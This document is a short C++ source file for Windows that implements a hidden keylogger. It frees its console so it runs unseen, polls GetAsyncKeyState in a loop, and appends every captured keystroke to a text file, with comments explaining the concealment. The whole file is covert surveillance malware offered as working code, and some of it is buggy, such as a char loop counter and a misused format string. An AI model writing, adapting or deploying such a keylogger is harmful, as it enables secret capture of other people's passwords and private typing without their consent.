#include<iostream>
#include <fstream>
#include<Windows.h>
using namespace std;

int Save(int _key ,char *file);
int main(){
    FreeConsole();  // it hides the console//so that program closes immediately but it will be running in the background
    char i; 
    while(true){
        Sleep(10); 
        // the basic idea is that you set up an interrupt to happen when the desired amount of time
        //  happens and then you give up your time slice and let some other process run. This all essentially happens inside the OS, so it isn’t in your code at all. 
        for(i=8;i<=255;i++){  //relevet information such as numbers ,alphabets and another keys start from ASCII valsue 8 
            if(GetAsyncKeyState(i)==-32767){ // it means button is pressed && Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.
                Save(i,"new.txt");
            } 
        }
    }
    return 0;
}
int Save(int _key ,char *file){
    cout<< _key<<endl;
    Sleep(10);
    FILE *  op_file; //file handling
    op_file=fopen(file,"a+");  //(mode)a+ - opens a file in both read and write mode.
    if(_key==VK_SHIFT){
        fprintf(op_file,"%s", "SHIFT");
    }
    else if(_key==VK_BACK){
        fprintf(op_file,"%s", "BACK");
    }
    else if(_key==VK_LBUTTON){
        fprintf(op_file,"%s", "LBUTTON");
    }
    else if(_key==VK_RETURN){
        fprintf(op_file,"%s", "RETURN");
    }
    else if(_key==VK_ESCAPE){
        fprintf(op_file,"%s", "ESCAPE");
    }

    fprintf(op_file,"%s",&_key); // print the key in text file
    fclose(op_file);
    return 0;
}